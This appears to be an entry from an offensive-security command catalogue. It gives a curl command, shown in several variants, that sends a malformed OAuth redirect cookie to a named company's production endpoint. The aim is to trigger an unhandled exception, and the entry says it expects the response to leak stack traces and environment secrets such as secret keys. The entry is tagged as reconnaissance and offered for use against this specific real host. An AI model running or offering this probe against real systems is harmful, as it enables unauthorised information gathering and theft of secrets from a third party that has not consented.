---
data: >-
  curl -X GET
  "https://oauth-redirector.services.greenhouse.io/integrations/oauth/create?state=x&code=x"
  -H "Cookie:
  oauth_redirect_uri=https%3A%2F%2Fapp.greenhouse.io%2Fusers%2Fauth%2Fgoogle_oauth2%2Fcallback"
  -v
tags:
  - recon
  - web
  - http
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:13.214Z'
id: 963ef6e7-78a6-48bf-95d8-991c093fbf95
verified: false
validated: true
submitted: true
---
# send-invalid-oauth-redirect-request

## Command

```bash
curl -X GET "https://oauth-redirector.services.greenhouse.io/integrations/oauth/create?state=x&code=x" -H "Cookie: oauth_redirect_uri=https%3A%2F%2Fapp.greenhouse.io%2Fusers%2Fauth%2Fgoogle_oauth2%2Fcallback" -v
```

## Description

This command sends an HTTP GET request to a Sintra-based OAuth endpoint with an invalid oauth_redirect_uri cookie to trigger an unhandled exception, potentially disclosing debug information. Use it during reconnaissance to probe for information leaks in web applications with enabled debug modes.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies the HTTP method as GET | Yes |
| URL | Target endpoint URL with dummy query params state and code | Yes |
| `-H "Cookie: ..."` | Sets the oauth_redirect_uri cookie to an invalid value to force exception | Yes |
| `-v` | Verbose mode to show request/response details | No |

## Examples

### Basic Usage

```bash
curl -X GET "https://oauth-redirector.services.greenhouse.io/integrations/oauth/create?state=x&code=x" -H "Cookie: oauth_redirect_uri=https%3A%2F%2Fapp.greenhouse.io%2Fusers%2Fauth%2Fgoogle_oauth2%2Fcallback"
```

### Advanced Usage

```bash
curl -X GET "https://oauth-redirector.services.greenhouse.io/integrations/oauth/create?state=x&code=x" -H "Cookie: oauth_redirect_uri=https%3A%2F%2Fapp.greenhouse.io%2Fusers%2Fauth%2Fgoogle_oauth2%2Fcallback" -v -o response.html
```

This saves the response to a file for offline analysis.

## Expected Output

A verbose HTTP response including headers and body. If successful, the body contains an HTML error page with exception details, stack traces, environment variables (e.g., lines like ENV['SECRET_KEY'] = 'value'), and code snippets. HTTP status is typically 500 Internal Server Error.

## Related

- [[Related Procedure: Trigger-Exception-to-Disclose-Debug-Information]]
